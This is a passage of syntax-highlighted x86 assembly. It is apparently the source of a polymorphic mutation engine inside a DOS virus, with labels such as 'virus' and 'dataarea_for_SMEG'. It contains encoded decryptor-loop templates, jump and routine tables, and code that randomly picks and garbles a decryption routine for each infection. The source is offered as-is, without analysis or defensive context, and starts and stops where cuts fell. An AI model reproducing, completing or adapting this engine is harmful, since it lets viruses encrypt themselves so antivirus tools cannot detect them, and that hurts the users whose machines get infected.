        </span><span class="sc1">; MOV reg0,CS                   (1)</span><span class="sc0">
        </span><span class="sc1">; MOV DS,reg0                   (2)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,encryption value     (E)</span><span class="sc0">
        </span><span class="sc1">; MOV reg2,reg1                 (8)</span><span class="sc0">
        </span><span class="sc1">; MOV reg1,initial counter      (4)</span><span class="sc0">
        </span><span class="sc1">; MOV reg7,initial pointer      (3)</span><span class="sc0">
        </span><span class="sc1">; beginning of loop             (0)</span><span class="sc0">
        </span><span class="sc1">; MOV reg2,reg1                 (8)</span><span class="sc0">
        </span><span class="sc1">; DEC reg1                      (D)</span><span class="sc0">
        </span><span class="sc1">; INC reg2                      (0D)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg2,reg0                (0C)</span><span class="sc0">
        </span><span class="sc1">; MOV reg1,reg0                 (0E)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg2,reg0                (0C)</span><span class="sc0">
        </span><span class="sc1">; XOR [reg7],reg0               (9)</span><span class="sc0">
        </span><span class="sc1">; INC reg7                      (C)</span><span class="sc0">
        </span><span class="sc1">; INC reg0                      (02)</span><span class="sc0">
        </span><span class="sc1">; INC reg0                      (02)</span><span class="sc0">
        </span><span class="sc1">; AND reg1,reg1                 (0F)</span><span class="sc0">
        </span><span class="sc1">; done                          (-1)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">12h</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc2">0C9h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0F0h</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">routineD</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">73h</span><span class="sc0">
        </span><span class="sc1">; MOV reg7,initial pointer      (3)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,CS                   (1)</span><span class="sc0">
        </span><span class="sc1">; MOV reg1,initial counter      (4)</span><span class="sc0">
        </span><span class="sc1">; MOV DS,reg0                   (2)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,encryption value     (E)</span><span class="sc0">
        </span><span class="sc1">; MOV reg1,initial counter      (4)</span><span class="sc0">
        </span><span class="sc1">; beginning of loop             (0)</span><span class="sc0">
        </span><span class="sc1">; DEC reg1                      (D)</span><span class="sc0">
        </span><span class="sc1">; DEC reg1                      (D)</span><span class="sc0">
        </span><span class="sc1">; DEC reg1                      (D)</span><span class="sc0">
        </span><span class="sc1">; NOT [reg7+offset]             (B)</span><span class="sc0">
        </span><span class="sc1">; PUSH reg0                     (0A)</span><span class="sc0">
        </span><span class="sc1">; PUSH [reg7+offset]            (08)</span><span class="sc0">
        </span><span class="sc1">; POP reg0                      (0B)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg2,reg0                (0C)</span><span class="sc0">
        </span><span class="sc1">; POP reg0                      (0B)</span><span class="sc0">
        </span><span class="sc1">; XOR reg2,reg0                 (F)</span><span class="sc0">
        </span><span class="sc1">; MOV [reg7+offset],reg2        (6)</span><span class="sc0">
        </span><span class="sc1">; INC reg0                      (02)</span><span class="sc0">
        </span><span class="sc1">; ADD reg7,1                    (04)</span><span class="sc0">
        </span><span class="sc1">; INC reg0                      (02)</span><span class="sc0">
        </span><span class="sc1">; SUB reg1,1                    (05)</span><span class="sc0">
        </span><span class="sc1">; done                          (-1)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">31h</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc2">0E4h</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0DDh</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc2">0A0h</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">0BFh</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">routine0</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,encryption value     (E)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg2,reg0                (0C)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,CS                   (1)</span><span class="sc0">
        </span><span class="sc1">; MOV reg7,initial pointer      (3)</span><span class="sc0">
        </span><span class="sc1">; MOV DS,reg0                   (2)</span><span class="sc0">
        </span><span class="sc1">; MOV reg1,initial counter      (4)</span><span class="sc0">
        </span><span class="sc1">; beginning of loop             (0)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg0,[reg7+offset]       (01)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg2,reg0                (0C)</span><span class="sc0">
        </span><span class="sc1">; XOR reg2,reg0                 (F)</span><span class="sc0">
        </span><span class="sc1">; DEC reg1                      (D)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg2,reg0                (0C)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg0,[reg7+offset]       (01)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg2,reg0                (0C)</span><span class="sc0">
        </span><span class="sc1">; MOV reg2,reg1                 (8)</span><span class="sc0">
        </span><span class="sc1">; INC reg7                      (C)</span><span class="sc0">
        </span><span class="sc1">; INC reg2                      (0D)</span><span class="sc0">
        </span><span class="sc1">; INC reg2                      (0D)</span><span class="sc0">
        </span><span class="sc1">; INC reg2                      (0D)</span><span class="sc0">
        </span><span class="sc1">; INC reg0                      (02)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg2,reg0                (0C)</span><span class="sc0">
        </span><span class="sc1">; MOV reg1,reg0                 (0E)</span><span class="sc0">
        </span><span class="sc1">; AND reg1,reg1                 (0F)</span><span class="sc0">
        </span><span class="sc1">; done                          (-1)</span><span class="sc0">
        </span><span class="sc1">; return code 0                 (0)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc2">0C1h</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc2">0CFh</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc2">0C8h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">routine6</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">55h</span><span class="sc0">
        </span><span class="sc1">; MOV reg1,initial counter      (4)</span><span class="sc0">
        </span><span class="sc1">; MOV reg7,initial pointer      (3)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,CS                   (1)</span><span class="sc0">
        </span><span class="sc1">; MOV DS,reg0                   (2)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,encryption value     (E)</span><span class="sc0">
        </span><span class="sc1">; MOV reg7,initial pointer      (3)</span><span class="sc0">
        </span><span class="sc1">; beginning of loop             (0)</span><span class="sc0">
        </span><span class="sc1">; MOV reg2,[reg7+offset]        (5)</span><span class="sc0">
        </span><span class="sc1">; DEC reg1                      (D)</span><span class="sc0">
        </span><span class="sc1">; SUB reg2,reg0                 (07)</span><span class="sc0">
        </span><span class="sc1">; INC reg0                      (02)</span><span class="sc0">
        </span><span class="sc1">; SUB reg1,1                    (05)</span><span class="sc0">
        </span><span class="sc1">; MOV [reg7+offset],reg2        (6)</span><span class="sc0">
        </span><span class="sc1">; INC reg7                      (C)</span><span class="sc0">
        </span><span class="sc1">; DEC reg1                      (D)</span><span class="sc0">
        </span><span class="sc1">; done                          (-1)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc4">,</span><span class="sc2">0E3h</span><span class="sc4">,</span><span class="sc2">5h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">0CDh</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">routineA</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">47h</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,encryption value     (E)</span><span class="sc0">
        </span><span class="sc1">; MOV reg7,initial pointer      (3)</span><span class="sc0">
        </span><span class="sc1">; MOV reg1,initial counter      (4)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg2,reg0                (0C)</span><span class="sc0">
        </span><span class="sc1">; MOV reg0,CS                   (1)</span><span class="sc0">
        </span><span class="sc1">; MOV DS,reg0                   (2)</span><span class="sc0">
        </span><span class="sc1">; beginning of loop             (0)</span><span class="sc0">
        </span><span class="sc1">; PUSH [reg7+offset]            (08)</span><span class="sc0">
        </span><span class="sc1">; POP reg0                      (0B)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg2,reg0                (0C)</span><span class="sc0">
        </span><span class="sc1">; XOR reg2,reg0                 (F)</span><span class="sc0">
        </span><span class="sc1">; MOV [reg7+offset],reg2        (6)</span><span class="sc0">
        </span><span class="sc1">; MOV reg2,reg1                 (8)</span><span class="sc0">
        </span><span class="sc1">; DEC reg1                      (D)</span><span class="sc0">
        </span><span class="sc1">; DEC reg0                      (03)</span><span class="sc0">
        </span><span class="sc1">; INC reg2                      (0D)</span><span class="sc0">
        </span><span class="sc1">; INC reg2                      (0D)</span><span class="sc0">
        </span><span class="sc1">; INC reg2                      (0D)</span><span class="sc0">
        </span><span class="sc1">; XCHG reg2,reg0                (0C)</span><span class="sc0">
        </span><span class="sc1">; MOV reg1,reg0                 (0E)</span><span class="sc0">
        </span><span class="sc1">; ADD reg7,1                    (04)</span><span class="sc0">
        </span><span class="sc1">; AND reg1,reg1                 (0F)</span><span class="sc0">
        </span><span class="sc1">; done                          (-1)</span><span class="sc0">
        </span><span class="sc1">; return code 0                 (0)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0E3h</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc2">0C1h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc2">0CFh</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">jmp_table</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">jmp0</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">jmp1</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">jmp2</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">jmp3</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">routine_table</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">routine0</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">routine1</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">routine2</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">routine3</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">routine4</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">routine5</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">routine6</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">routine7</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">routine8</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">routine9</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">routineA</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">routineB</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">routineC</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">routineD</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">routineE</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">routineF</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">counterinit0</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">counterinit1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">counterinit2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">counterinit3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">counterinit4</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">counterinit5</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">counterinit6</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">counterinit7</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">jmp0</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">                 </span><span class="sc1">; encode a JMP</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                            </span><span class="sc1">; (with word offset)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">; calculate offset to</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">loop_top</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; top of decryption loop</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; adjust for jmp instruction</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; adjust for going back instead</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">                             </span><span class="sc1">; of forwards</span><span class="sc0">
</span><span class="sc5">jmp1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0E0FFh</span><span class="sc0">               </span><span class="sc1">; encode JMP register</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">jmp2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C350h</span><span class="sc0">                </span><span class="sc1">; encode PUSH/RETn</span><span class="sc0">
</span><span class="sc5">jmpXdone</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">jmp3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Eh</span><span class="sc0">                   </span><span class="sc1">; encode PUSH CS</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">garble_some</span><span class="sc0">              </span><span class="sc1">; garble a bit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0CB50h</span><span class="sc0">                </span><span class="sc1">; encode PUSH reg/RETN</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">jmpXdone</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">encode_routine</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_any_ax</span><span class="sc0">           </span><span class="sc1">; pick a random routine</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">routine_table</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; to use</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                            </span><span class="sc1">; get the first byte</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">crypt_type</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; and save it</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">encode_routine2</span><span class="sc0">   </span><span class="sc1">; keep going...</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">encode_it</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                            </span><span class="sc1">; get the next byte</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; are we done?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">       </span><span class="sc5">use_as_is</span><span class="sc0">               </span><span class="sc1">; if so, exit</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">                   </span><span class="sc1">; convert AL to</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; offset in encode_table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">encode_table</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">; write the resulting byte</span><span class="sc0">
</span><span class="sc5">use_as_is</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">fill_mod_field</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc5">fill_field</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">                   </span><span class="sc1">; get the register # al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">dataarea_for_SMEG</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">xlat</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">; encoding rm or reg?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">not_memory</span><span class="sc0">              </span><span class="sc1">; branch if doing rm</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; memory access?</span><span class="sc0">
